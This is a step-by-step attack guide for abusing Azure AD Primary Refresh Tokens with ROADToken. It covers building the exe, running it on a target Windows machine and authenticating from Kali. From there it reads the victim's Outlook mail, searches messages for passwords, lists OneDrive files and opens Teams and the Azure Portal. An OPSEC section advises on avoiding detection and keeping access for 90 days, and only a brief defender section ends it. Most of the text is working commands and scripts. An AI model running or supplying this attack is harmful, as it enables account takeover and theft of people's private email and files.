# ROADToken — Azure AD PRT Cookie Abuse
## Complete Penetration Testing Guide

> **Goal:** Run one exe on a target Windows machine, grab a token, bring it to Kali,
> and read the victim's Outlook — no password, no MFA, no admin rights.

---

## Table of Contents

1. [How It Works](#1-how-it-works)
2. [Understanding the Nonce](#2-understanding-the-nonce)
3. [Requirements](#3-requirements)
4. [Build ROADToken.exe (Windows, No IDE)](#4-build-roadtokenexe-windows-no-ide)
5. [Kali Setup](#5-kali-setup)
6. [Step 1 — Check the Target](#6-step-1--check-the-target)
7. [Step 2 — Get the Nonce (Kali)](#7-step-2--get-the-nonce-kali)
8. [Step 3 — Run ROADToken on Target (Windows)](#8-step-3--run-roadtoken-on-target-windows)
9. [Step 4 — Authenticate from Kali](#9-step-4--authenticate-from-kali)
10. [Step 5 — Read Victim's Outlook (Kali)](#10-step-5--read-victims-outlook-kali)
11. [Step 5B — Open Outlook in Browser (Optional)](#11-step-5b--open-outlook-in-browser-optional)
12. [What You Now Have](#12-what-you-now-have)
13. [OPSEC](#13-opsec)
14. [Troubleshooting](#14-troubleshooting)
15. [Defender Notes](#15-defender-notes)

---

## 1. How It Works

```
KALI                                    TARGET WINDOWS (Azure AD joined)
════                                    ════════════════════════════════

1. curl → Microsoft
   get a nonce (random challenge)
         │
         └──── paste nonce to target ──────────────────────────────┐
                                                                    ▼
                                              2. ROADToken.exe <nonce>
                                                 talks to BrowserCore.exe
                                                 BrowserCore signs the PRT
                                                 outputs a JWT cookie
                                                    │
         ┌──── copy JWT back to Kali ───────────────┘
         ▼
3. roadrecon auth --prt-cookie <JWT>
   Microsoft accepts the signed PRT
   returns access token + refresh token
         │
         ▼
4. curl Graph API → victim's Outlook inbox
   PROOF: victim's emails on your screen
```

### Why it works

Every Azure AD joined Windows machine has a **Primary Refresh Token (PRT)** — a master
credential that silently signs the user into any Microsoft 365 app.

`BrowserCore.exe` is a Windows system binary that Chrome uses to request SSO cookies
backed by that PRT. The problem: **BrowserCore.exe doesn't verify its caller is Chrome**.
ROADToken calls it directly, gets back a cryptographically valid signed JWT, and that JWT
is accepted by Microsoft as a legitimate login from the device.

### Token properties

| Property | Value |
|---|---|
| Valid for | 90 days, auto-renews on use |
| MFA claim | Yes — inherits from PRT |
| Conditional Access | Passes — includes device compliance claim |
| Works from | Any machine, not tied to target |
| Admin rights needed | None |

---

## 2. Understanding the Nonce

**Why can you get it from Kali with no authentication at all?**

The nonce is just a **random challenge** Azure AD generates on demand. Think of it like this:

```
PUBLIC  →  Nonce        (anyone can request it — useless alone)
PRIVATE →  PRT Session Key  (locked in the device's TPM/memory)
RESULT  →  Signed JWT   (only the device can produce this)
```

Azure AD must give the nonce **before** authentication because the device uses the nonce
**to prove** who it is. You can't authenticate without the nonce, so the nonce must be
public — same design as TLS, Kerberos, SSH.

Without the device's PRT session key, a nonce is useless. An attacker can't forge the
signed JWT — only the target machine can, because only it has the key.

**The actual vulnerability is:** BrowserCore.exe accepts calls from any process, not just
Chrome. ROADToken exploits this to get a real, valid signed JWT without being Chrome.

**Nonce lifetime:** ~5–10 minutes. Get it → immediately run ROADToken → immediately authenticate.

---

## 3. Requirements

### Target (Windows)

| Requirement | How to check |
|---|---|
| Azure AD Joined | `dsregcmd /status` → `AzureAdJoined : YES` |
| User has a PRT | `dsregcmd /status` → `AzureAdPrt : YES` |
| BrowserCore.exe exists | `C:\Windows\BrowserCore\browsercore.exe` |

> Hybrid joined (on-prem AD + Azure AD) also works. Pure on-prem AD only does NOT.

### Attacker (Kali)

| Requirement | Check |
|---|---|
| Python 3.9+ | `python3 --version` |
| pip | `pip3 --version` |
| Internet to Microsoft | `login.microsoftonline.com`, `graph.microsoft.com` |

### What goes on the target

**One file only: `ROADToken.exe`** — no Python, no pip, nothing else.

---

## 4. Build ROADToken.exe (Windows, No IDE)

Windows already ships with the C# compiler and MSBuild inside
`C:\Windows\Microsoft.NET\`. No Visual Studio needed.

```powershell
# Clone the repo (already has the corrected source code)
git clone https://github.com/Edd13Mora/AzureToken_exercice.git
cd AzureToken_exercice

# Build — one command, that's it
& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" ROADToken.csproj /p:Configuration=Release
```

Output: `bin\Release\ROADToken.exe` (~7 KB, standalone, no dependencies)

**Verify it works:**
```powershell
.\bin\Release\ROADToken.exe
```

Expected (this is normal — no nonce was given):
```
No nonce supplied, refresh cookie will likely not work!
r{"status": "Fail", "code": "OSError" ...}
0
```

The `OSError` just means no nonce was provided. The binary is working correctly.

> You can also download the pre-built exe directly from the
> [Releases page](https://github.com/Edd13Mora/AzureToken_exercice/releases/tag/v1.0).

---

## 5. Kali Setup

```bash
pip3 install roadrecon roadtx
```

Verify:
```bash
roadrecon --help
```

### Optional — for Step 5B (browser visual proof)

```bash
sudo apt install -y firefox-esr

GECKO_VER="v0.35.0"
wget -q "https://github.com/mozilla/geckodriver/releases/download/${GECKO_VER}/geckodriver-${GECKO_VER}-linux64.tar.gz"
tar -xzf geckodriver-${GECKO_VER}-linux64.tar.gz
sudo mv geckodriver /usr/local/bin/
```

---

## 6. Step 1 — Check the Target

Run on the **target Windows machine**:

```powershell
dsregcmd /status | Select-String "AzureAdJoined|AzureAdPrt"
```

You need to see:
```
AzureAdJoined : YES
AzureAdPrt    : YES
```

Also confirm BrowserCore.exe is there:
```powershell
Test-Path "C:\Windows\BrowserCore\browsercore.exe"
```

Must return `True`. If not, try:
```powershell
Test-Path "C:\Program Files\Windows Security\BrowserCore\browsercore.exe"
```

---

## 7. Step 2 — Get the Nonce (Kali)

Run on **Kali**:

```bash
NONCE=$(curl -s -X POST https://login.microsoftonline.com/common/oauth2/token \
  -d "grant_type=srv_challenge" | python3 -c "import sys,json; print(json.load(sys.stdin)['Nonce'])")

echo "Your nonce: $NONCE"
```

Copy the nonce string. You have ~10 minutes before it expires — proceed immediately.

---

## 8. Step 3 — Run ROADToken on Target (Windows)

Transfer `ROADToken.exe` to the target machine, open PowerShell there, and run:

```powershell
# Paste your nonce between the quotes
$nonce = "PASTE_NONCE_HERE"

# Run the tool and extract the JWT automatically
$output = .\ROADToken.exe $nonce
$json = ($output | Select-String '\{.*\}').Matches[0].Value | ConvertFrom-Json
$prt_cookie = $json.response[0].data

Write-Host "`n=== COPY THIS JWT ===" -ForegroundColor Green
Write-Host $prt_cookie
Write-Host "=== END ===" -ForegroundColor Green
```

The output will be a long string starting with `eyJ` — that is your PRT cookie.
Copy the entire string back to Kali.

---

## 9. Step 4 — Authenticate from Kali

On **Kali**, paste the JWT and authenticate:

```bash
# Save the JWT (paste between the quotes)
PRT_COOKIE="eyJhbGci...YOUR_FULL_JWT_HERE..."
echo "$PRT_COOKIE" > prt_cookie.txt

# Authenticate with Microsoft using the PRT cookie
roadrecon auth --prt-cookie "$PRT_COOKIE" \
  -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com
```

Success output:
```
Tokens were written to .roadtools_auth
```

Confirm who you are authenticated as:
```bash
python3 -c "
import json, base64
d = json.load(open('.roadtools_auth'))
p = d['accessToken'].split('.')[1]
p += '=' * (4 - len(p) % 4)
t = json.loads(base64.b64decode(p))
print('Logged in as:', t.get('upn', t.get('unique_name')))
print('Tenant:      ', t.get('tid'))
print('MFA claim:   ', t.get('amr'))
"
```

---

## 10. Step 5 — Read Victim's Outlook (Kali)

```bash
# Load the access token
TOKEN=$(python3 -c "import json; d=json.load(open('.roadtools_auth')); print(d['accessToken'])")
```

### Get victim profile

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me?\$select=displayName,mail,jobTitle" \
  | python3 -m json.tool
```

### Read inbox (last 10 emails)

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?\$top=10&\$select=subject,from,receivedDateTime&\$orderby=receivedDateTime%20desc" \
  | python3 -m json.tool
```

### Read a specific email body

```bash
# Grab the id from the inbox listing above
EMAIL_ID="AAMkAGI2..."

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages/${EMAIL_ID}?\$select=subject,body,from" \
  | python3 -m json.tool
```

### Search for sensitive emails

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/messages?\$search=\"password\"&\$top=5&\$select=subject,from,receivedDateTime" \
  | python3 -m json.tool
```

### List OneDrive files

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/drive/root/children?\$select=name,size,lastModifiedDateTime" \
  | python3 -m json.tool
```

### All-in-one proof script

Save as `proof.sh`, run once to show everything:

```bash
#!/bin/bash
# proof.sh
# Usage: ./proof.sh   (reads prt_cookie.txt automatically)

set -e

PRT_COOKIE=$(cat prt_cookie.txt)

echo "[*] Authenticating..."
roadrecon auth --prt-cookie "$PRT_COOKIE" \
  -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com

TOKEN=$(python3 -c "import json; d=json.load(open('.roadtools_auth')); print(d['accessToken'])")

echo "[*] Getting victim identity..."
PROFILE=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me?\$select=displayName,mail,jobTitle")

NAME=$(echo "$PROFILE"  | python3 -c "import sys,json; print(json.load(sys.stdin).get('displayName','N/A'))")
EMAIL=$(echo "$PROFILE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('mail','N/A'))")
TITLE=$(echo "$PROFILE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('jobTitle','N/A'))")

echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║            ACCESS CONFIRMED                      ║"
echo "╠══════════════════════════════════════════════════╣"
printf "║  Name:  %-41s║\n" "$NAME"
printf "║  Email: %-41s║\n" "$EMAIL"
printf "║  Title: %-41s║\n" "$TITLE"
echo "╚══════════════════════════════════════════════════╝"

echo ""
echo "[*] Last 5 inbox emails:"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?\$top=5&\$select=subject,from,receivedDateTime&\$orderby=receivedDateTime%20desc" \
  | python3 -c "
import sys, json
msgs = json.load(sys.stdin).get('value', [])
for m in msgs:
    dt   = m.get('receivedDateTime','')[:10]
    frm  = m.get('from',{}).get('emailAddress',{}).get('address','?')
    subj = m.get('subject','(no subject)')
    print(f'  [{dt}] {frm}')
    print(f'         {subj}')
    print()
"
echo "[+] Tokens saved to .roadtools_auth"
```

```bash
chmod +x proof.sh && ./proof.sh
```

---

## 11. Step 5B — Open Outlook in Browser (Optional)

Opens a real Firefox window on Kali, logged into the victim's Outlook — no password prompt.
Requires geckodriver installed (see Section 5).

```bash
roadtx browserprtauth \
  --prt-cookie "$(cat prt_cookie.txt)" \
  --url "https://outlook.office.com/mail"
```

Other apps:
```bash
# Teams
roadtx browserprtauth --prt-cookie "$(cat prt_cookie.txt)" --url "https://teams.microsoft.com"

# Azure Portal
roadtx browserprtauth --prt-cookie "$(cat prt_cookie.txt)" --url "https://portal.azure.com"
```

---

## 12. What You Now Have

After Step 4, `.roadtools_auth` contains:

| Token | Validity | Use |
|---|---|---|
| `accessToken` | ~1 hour | API calls right now |
| `refreshToken` | **90 days, auto-renews** | Get new tokens anytime |

The refresh token is **fully detached from the target machine**:
- Target turned off → still works
- User changes password → still works
- Device wiped → still works

The only way to kill it: admin explicitly revokes it (see Section 15).

### Reuse the token weeks later (no target access needed)

```bash
roadrecon auth --refresh-token file \
  -c d3590ed6-52b3-4102-aeff-aad2292ab01c \
  -r https://graph.microsoft.com
```

---

## 13. OPSEC

### What gets logged in Azure AD

| Action | Logged |
|---|---|
| `roadrecon auth --prt-cookie` | YES — sign-in log |
| Graph API calls with access token | NO |
| Refresh token → new access token | NO |

### What defenders see on the target

Chrome calls BrowserCore.exe with named pipes:
```
cmd.exe → BrowserCore.exe chrome-extension://... < \\.\pipe\... > \\.\pipe\...
```

ROADToken calls it directly with no pipes — a Sysmon alert will fire in monitored environments.

**Best practice:** Run ROADToken once, get the cookie, never run it again. All further
access happens from Kali via the refresh token.

---

## 14. Troubleshooting

### ROADToken returns `OSError`
`AzureAdJoined` or `AzureAdPrt` is NO. Verify with `dsregcmd /status`.

### `roadrecon auth` fails silently
Nonce expired. Get a fresh one from Kali and immediately re-run ROADToken.

### Graph API returns `401`
Wrong resource. Make sure you used `-r https://graph.microsoft.com`.

### Graph API returns `403`
Try a different client ID:
```bash
roadrecon auth --prt-cookie "$(cat prt_cookie.txt)" \
  -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 \
  -r https://graph.microsoft.com
```

### JWT looks corrupted
Must be one continuous string starting with `eyJ`, no spaces or line breaks.
Check: `wc -c < prt_cookie.txt` — should be 500+ characters.

### `roadtx browserprtauth` fails
```bash
which geckodriver && geckodriver --version
```
If missing, install it from Section 5.

---

## 15. Defender Notes

### Detection

- **Sysmon Event ID 1:** BrowserCore.exe spawned by a non-Chrome parent with no pipe args
- **Azure AD Sign-in logs:** unexpected app ID (`d3590ed6`) or unusual IP for the user

### Response

```powershell
# Revoke all tokens for the user immediately
Connect-AzureAD
Revoke-AzureADUserAllRefreshToken -ObjectId "victim@contoso.com"
Set-AzureADUser -ObjectId "victim@contoso.com" -RefreshTokensValidFromDateTime (Get-Date)
```

Also disable the compromised device in Azure AD → Devices → select device → Disable.

---

*Tool: ROADToken — https://github.com/dirkjanm/ROADtoken*
*Framework: ROADtools — https://github.com/dirkjanm/ROADtools*
*Blog: https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/*
